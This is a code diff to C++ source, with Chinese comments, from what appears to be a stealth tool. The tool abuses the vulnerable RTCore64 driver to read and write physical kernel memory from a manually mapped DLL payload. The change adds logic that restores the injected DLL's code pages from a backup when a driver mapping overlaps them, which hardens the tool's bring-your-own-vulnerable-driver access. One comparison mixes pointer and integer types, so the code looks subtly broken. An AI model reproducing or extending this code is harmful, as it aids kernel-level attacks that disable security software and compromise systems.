@@ -55,6 +55,13 @@ static void ByovdDiag(const char* fmt, ...) {
 
 #pragma comment(lib, "advapi32.lib")
 
+// ★ v3.78: 全局引用 payload.cpp 中的 VEH 自愈备份缓冲区
+//   由 MapPhysical 的主动恢复使用
+extern uint8_t* g_backupBuf;
+extern SIZE_T   g_backupLen;
+extern uint8_t* g_backupCodeBase;
+extern void*    g_vehHandlerPageVA;
+
 namespace stealth {
 
 // ============================================================
@@ -549,16 +556,57 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
     mapping.virtAddr = mappedAddr;
     g_physMappings.push_back(mapping);
 
-    // ★ v3.69: 检测 IOCTL 映射是否覆盖了 DLL 代码区域
-    //   RTCore64 驱动通过 MmMapIoSpace/MDL 映射物理内存到用户 VA,
-    //   可能与 manual-map DLL 的代码页重叠, 导致:
-    //   - ReadPhysical: 读到错误数据 (非预期的物理内存内容)
-    //   - WritePhysical: 直接覆盖 DLL 代码 → STATUS_PRIVILEGED_INSTRUCTION 崩溃
+    // ★ v3.78: 检测 IOCTL 映射是否覆盖了受保护区 (DLL代码/备份缓冲区)
+    //   RTCore64 驱动已通过 MmMapIoSpace/MDL 修改了 PTE — 破坏已发生!
+    //   检测到重叠后, 先从备份恢复被破坏的页面, 再返回 false
     if (IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize)) {
-        ByovdDiag("BYOVD:MapPhysical: OVERLAP DETECTED! mappedVA=0x%llX size=%u phys=0x%llX\n",
+        ByovdDiag("BYOVD:MapPhysical: OVERLAP! mappedVA=0x%llX size=%u phys=0x%llX\n",
             (unsigned long long)mappedAddr, alignedSize, (unsigned long long)alignedAddr);
-        // 不从重叠映射返回 — 防止 DLL 代码被污染
-        // 调用方 (ReadPhysical/WritePhysical) 会收到 false 并优雅降级
+
+        // ★ v3.78: 主动恢复 — 逐页检查并修复被破坏的受保护区
+        if (::g_backupBuf && ::g_backupCodeBase && ::g_backupLen > 0) {
+            uintptr_t overlapStart = (uintptr_t)mappedAddr;
+            uintptr_t overlapEnd   = overlapStart + alignedSize;
+            uintptr_t codeStart    = (uintptr_t)::g_backupCodeBase;
+            uintptr_t codeEnd      = codeStart + ::g_backupLen;
+
+            // 找到映射与代码区的交集
+            uintptr_t restoreStart = (overlapStart > codeStart) ? overlapStart : codeStart;
+            uintptr_t restoreEnd   = (overlapEnd   < codeEnd)   ? overlapEnd   : codeEnd;
+
+            if (restoreStart < restoreEnd) {
+                SIZE_T restoreOff = restoreStart - codeStart;
+                SIZE_T restoreSz  = restoreEnd - restoreStart;
+                BYTE* restoreDst  = (BYTE*)restoreStart;
+                BYTE* restoreSrc  = ::g_backupBuf + restoreOff;
+
+                // 逐页恢复, 保存/恢复原始保护
+                SIZE_T restoredBytes = 0;
+                while (restoredBytes < restoreSz) {
+                    SIZE_T chunk = ((restoreSz - restoredBytes) < 0x1000)
+                        ? (restoreSz - restoredBytes) : 0x1000;
+                    void* pageVA = restoreDst + restoredBytes;
+
+                    // 跳过 VEH handler 所在页 (保持不变)
+                    if (::g_vehHandlerPageVA && pageVA == (uintptr_t)::g_vehHandlerPageVA) {
+                        restoredBytes += chunk;
+                        continue;
+                    }
+
+                    DWORD oldProt = 0, dummy = 0;
+                    VirtualProtect(pageVA, chunk, PAGE_READWRITE, &oldProt);
+                    memcpy(pageVA, restoreSrc + restoredBytes, chunk);
+                    // 恢复原始保护 (非强制 EXECUTE_READ)
+                    VirtualProtect(pageVA, chunk,
+                        (oldProt == PAGE_READWRITE) ? PAGE_READWRITE : PAGE_EXECUTE_READ,
+                        &dummy);
+                    restoredBytes += chunk;
+                }
+                ByovdDiag("BYOVD:MapPhysical: proactively restored %llu bytes from overlap\n",
+                    (unsigned long long)restoredBytes);
+            }
+        }
+
         g_physMappings.pop_back();
         return false;
     }
